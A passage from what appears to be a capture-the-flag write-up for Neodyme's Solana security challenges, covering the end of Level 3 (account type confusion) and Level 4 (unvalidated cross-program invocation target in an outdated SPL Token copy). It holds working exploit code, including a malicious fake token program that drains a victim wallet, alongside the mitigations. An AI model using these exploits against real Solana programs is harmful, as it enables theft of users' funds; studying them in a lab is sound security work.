    let drain_amount = sol_to_lamports(1_000_000.0);

    // step 1: initialize a new vault that will later be interpreted as a TipPool
    // creator        -> forged withdraw_authority (hacker)
    // fee             -> forged pool.value (via f64 → u64)
    // fee_recipient   -> forged pool.vault (real vault address)
    assert_tx_success(env.execute_as_transaction(
        &[level3::initialize(
            challenge.tip_program,
            fake_pool_pda,
            challenge.hacker.pubkey(),
            fake_seed,
            2.0,
            challenge.vault_address,
        )],
        &[&challenge.hacker],
    ));

    // step 2: call withdraw using the fake “pool” and the real vault
    // all withdraw checks pass due to crafted layout
    assert_tx_success(env.execute_as_transaction(
        &[level3::withdraw(
            challenge.tip_program,
            challenge.vault_address, // real vault with lamports
            fake_pool_pda,           // fake pool (actually a Vault)
            challenge.hacker.pubkey(),
            drain_amount,
        )],
        &[&challenge.hacker],
    ));
}

\`\`\`

## Output:

![Delegate Address Screenshot](/images/Neodyme/level3.png)

## Mitigation of this exploit:

Add an explicit account discriminator.

Every account type must start with a **unique, constant tag**.

\`\`\`javascript
pub const TIP_POOL_TAG: u8 = 1;
pub const VAULT_TAG: u8 = 2;

#[repr(C)]
pub struct TipPool {
    pub tag: u8,
    pub withdraw_authority: Pubkey,
    pub value: u64,
    pub vault: Pubkey,
}

// Enforce it on deserialization
let pool = TipPool::deserialize(&mut &data[..])?;
if pool.tag != TIP_POOL_TAG {
    return Err(ProgramError::InvalidAccountData);
}

\`\`\`

# Level 4

## Challenge:

Our goal is to “Steal the SPL tokens from the wallet”.

Before solving this level, I took some time to research more about the SPL token and CPI (Cross Program Invocation).

Solana’s Cross-Program Invocation (CPI) model is powerful, but it also introduces a subtle trust boundary: when one program calls another, **privileges (signer & writable) are forwarded automatically**. If a program fails to verify *which* program it is invoking, then  it can be abused.

In this challenge, it revolves around exactly this pitfall.

## Solution:

\`\`\`javascript
//processor.rs
use borsh::BorshDeserialize;
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint::ProgramResult,
    msg,
    program::{invoke, invoke_signed},
    program_pack::Pack,
    pubkey::Pubkey,
    rent::Rent,
    system_instruction,
    sysvar::Sysvar,
};

use crate::{get_authority, get_wallet_address, WalletInstruction};

// There's a mitigation for this bug in spl-token 3.1.1
// vendored_spl_token is an exact copy of spl-token 3.1.0, which doesn't have the mitigation yet
use vendored_spl_token as spl_token;

pub fn process_instruction(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    mut instruction_data: &[u8],
) -> ProgramResult {
    match WalletInstruction::deserialize(&mut instruction_data)? {
        WalletInstruction::Initialize => initialize(program_id, accounts),
        WalletInstruction::Deposit { amount } => deposit(program_id, accounts, amount),
        WalletInstruction::Withdraw { amount } => withdraw(program_id, accounts, amount),
    }
}

fn initialize(program_id: &Pubkey, accounts: &[AccountInfo]) -> ProgramResult {
    msg!("init");
    let account_info_iter = &mut accounts.iter();
    let wallet_info = next_account_info(account_info_iter)?;
    let authority_info = next_account_info(account_info_iter)?;
    let owner = next_account_info(account_info_iter)?;
    let mint = next_account_info(account_info_iter)?;
    let rent_info = next_account_info(account_info_iter)?;
    let spl_token = next_account_info(account_info_iter)?;

    let (wallet_address, wallet_seed) = get_wallet_address(owner.key, program_id);
    let (authority_address, _) = get_authority(program_id);
    let rent = Rent::from_account_info(rent_info)?;

    assert_eq!(wallet_info.key, &wallet_address);
    assert_eq!(authority_info.key, &authority_address);
    assert!(owner.is_signer, "owner must sign!");

    invoke_signed(
        &system_instruction::create_account(
            &owner.key,
            &wallet_address,
            rent.minimum_balance(spl_token::state::Account::LEN),
            spl_token::state::Account::LEN as u64,
            &spl_token.key,
        ),
        &[owner.clone(), wallet_info.clone()],
        &[&[&owner.key.to_bytes(), &[wallet_seed]]],
    )?;

    invoke(
        &spl_token::instruction::initialize_account(
            &spl_token.key,
            &wallet_address,
            mint.key,
            &authority_address,
        )
        .unwrap(),
        &[
            authority_info.clone(),
            wallet_info.clone(),
            mint.clone(),
            rent_info.clone(),
        ],
    )?;

    Ok(())
}

fn deposit(_program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {
    msg!("deposit {}", amount);
    let account_info_iter = &mut accounts.iter();
    let wallet_info = next_account_info(account_info_iter)?;
    let source_info = next_account_info(account_info_iter)?;
    let user_authority_info = next_account_info(account_info_iter)?;
    let mint = next_account_info(account_info_iter)?;
    let spl_token = next_account_info(account_info_iter)?;

    let decimals = mint.data.borrow()[44];

    invoke(
        &spl_token::instruction::transfer_checked(
            &spl_token.key,
            &source_info.key,
            mint.key,
            wallet_info.key,
            user_authority_info.key,
            &[],
            amount,
            decimals,
        )
        .unwrap(),
        &[
            wallet_info.clone(),
            source_info.clone(),
            user_authority_info.clone(),
            mint.clone(),
        ],
    )?;

    Ok(())
}

fn withdraw(program_id: &Pubkey, accounts: &[AccountInfo], amount: u64) -> ProgramResult {
    msg!("withdraw {}", amount);
    let account_info_iter = &mut accounts.iter();
    let wallet_info = next_account_info(account_info_iter)?;
    let authority_info = next_account_info(account_info_iter)?;
    let owner_info = next_account_info(account_info_iter)?;
    let destination_info = next_account_info(account_info_iter)?;
    let mint = next_account_info(account_info_iter)?;
    let spl_token = next_account_info(account_info_iter)?;

    let (wallet_address, _) = get_wallet_address(owner_info.key, program_id);
    let (authority_address, authority_seed) = get_authority(program_id);

    assert_eq!(wallet_info.key, &wallet_address);
    assert_eq!(authority_info.key, &authority_address);
    assert!(owner_info.is_signer, "owner must sign!");

    let decimals = mint.data.borrow()[44];

    invoke_signed(
        &spl_token::instruction::transfer_checked(
            &spl_token.key,
            &wallet_info.key,
            mint.key,
            destination_info.key,
            authority_info.key,
            &[],
            amount,
            decimals,
        )
        .unwrap(),
        &[
            wallet_info.clone(),
            destination_info.clone(),
            authority_info.clone(),
            mint.clone(),
        ],
        &[&[&[authority_seed]]],
    )?;

    Ok(())
}

\`\`\`

The above program contains intialize() which creates a PDA-Owned token account and deposit() function transfer SPL tokens into the PDA wallet and withdraw() transfers SPL tokens out of the PDA wallet.

Conceptually, the withdraw flow looks like this:

\`\`\`javascript

invoke_signed(
    spl_token::instruction::transfer_checked(
        token_program,        // user-provided
        wallet_pda,           // source
        mint,
        destination,
        authority_pda,        // PDA signer
        ...
    ),
    accounts,
    signer_seeds,
)
\`\`\`

At a glance, this looks secure that the wallet PDA is validated and the authority PDA is validated and also the owner must sign.

However, the token program itself is **not validated :)**

Here the wallet program uses the  vendored copy of SPL Token v3.1.0.

This version allows constructing token instructions without verifying that the provided program ID is actually the real SPL Token program.

That means the caller can supply:

\`\`\`javascript
spl_token_program = attacker_controlled_program
\`\`\`

The wallet program will blindly perform a CPI to that program while forwarding writable privileges and PDA signer privileges.

The wallet program assumes it is calling SPL Token, but in reality it is calling arbitrary attacker-controlled code.

This exact issue was later patched in SPL Token v3.1.1 by adding a program ID validation step.

These are the steps that we have to follow to solve this challenge.

1. Deploy the fake spl token program and this program  implements just enough instruction decoding to accept TransferChecked.
2. Instead of enforcing token logic, it performs a CPI to the real SPL Token program and transfer funds in the attacker’s favour.
3. Then invoke the wallet’s withdraw instruction, but replaces the spl_token_program account with the malicious program’s ID. 

Overview of the solution: 

![Delegate Address Screenshot](/images/Neodyme/level4A.png)

\`\`\`javascript

//level4-poc-contract/src/lib.rs
use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    msg,
    program::invoke,
    program_error::ProgramError,
    pubkey::Pubkey,
};
use spl_token;

entrypoint!(process_instruction);

/// Minimal decoder for SPL Token TransferChecked
fn decode_transfer_checked(ix: &[u8]) -> Result<(u64, u8), ProgramError> {
    if ix.len() < 10 {
        return Err(ProgramError::InvalidInstructionData);
    }

    let tag = ix[0];
    if tag != 12 {
        return Err(ProgramError::InvalidInstructionData);
    }

    let mut amt_bytes = [0u8; 8];
    amt_bytes.copy_from_slice(&ix[1..9]);
    let amount = u64::from_le_bytes(amt_bytes);
    let decimals = ix[9];

    Ok((amount, decimals))
}

pub fn process_instruction(
    _program_id: &Pubkey,
    accounts: &[AccountInfo],
    instruction_data: &[u8],
) -> ProgramResult {
    let (amount, _decimals) = decode_transfer_checked(instruction_data)?;

    let accs = &mut accounts.iter();
    let hacker_wallet = next_account_info(accs)?;      // wallet controlled by attacker
    let _mint = next_account_info(accs)?;              // ignored (spoofed by caller)
    let victim_wallet = next_account_info(accs)?;      // rich boi wallet
    let wallet_authority = next_account_info(accs)?;   // PDA authority forwarded by CPI

    msg!("Draining {} tokens from victim to hacker", amount);

    invoke(
        &spl_token::instruction::transfer(
            &spl_token::id(),
            victim_wallet.key,
            hacker_wallet.key,
            wallet_authority.key,
            &[],
            amount,
        )?,
        &[
            victim_wallet.clone(),
            hacker_wallet.clone(),
            wallet_authority.clone(),
        ],
    )?;

    Ok(())
}
\`\`\`

\`\`\`javascript

//level4.rs

// Do your hacks in this function here
fn hack(env: &mut LocalEnvironment, challenge: &Challenge) {
    // Deploy attacker-controlled fake SPL token program
    let evil_token_program = env.deploy_program("target/deploy/level4_poc_contract.so");

    // Step 1: Initialize hacker wallet in wallet program
    let init_ix = level4::initialize(
        challenge.wallet_program,
        challenge.hacker.pubkey(),
        challenge.mint,
    );

    assert_tx_success(env.execute_as_transaction(
        &[init_ix],
        &[&challenge.hacker],
    ));

    // Resolve hacker wallet PDA
    let hacker_wallet =
        level4::get_wallet_address(&challenge.hacker.pubkey(), &challenge.wallet_program).0;

    let amount = sol_to_lamports(1_000_000.0);

    // Step 2: Abuse withdraw with fake token program
    let steal_ix = Instruction {
        program_id: challenge.wallet_program,
        accounts: vec![
            AccountMeta::new(hacker_wallet, false), // wallet_info (attacker wallet)
            AccountMeta::new_readonly(level4::get_authority(&challenge.wallet_program).0, false),
            AccountMeta::new_readonly(challenge.hacker.pubkey(), true), // owner signs
            AccountMeta::new(challenge.wallet_address, false), // destination (victim wallet)
            AccountMeta::new_readonly(spl_token::id(), false), // mint spoof
            AccountMeta::new_readonly(evil_token_program, false), // fake SPL token program
        ],
        data: level4::WalletInstruction::Withdraw { amount }
            .try_to_vec()
            .unwrap(),
    };

    assert_tx_success(env.execute_as_transaction(
        &[steal_ix],
        &[&challenge.hacker],
    ));
}
\`\`\`

## Output:

![Delegate Address Screenshot](/images/Neodyme/level4B.png)

## Mitigation of this exploit:

### Always validate CPI targets

Never trust program IDs passed in from users and hardcode or strictly check the expected program address:

\`\`\`javascript

require!(token_program.key == spl_token::id(), InvalidProgram);

\`\`\`

### Vendored dependencies can be dangerous

Using an outdated vendored SPL Token version introduced a vulnerability that had already been patched upstream.

## Reference:

[Neodyme Solana Common Pitfalls](https://neodyme.io/en/blog/solana_common_pitfalls/)
  
`
};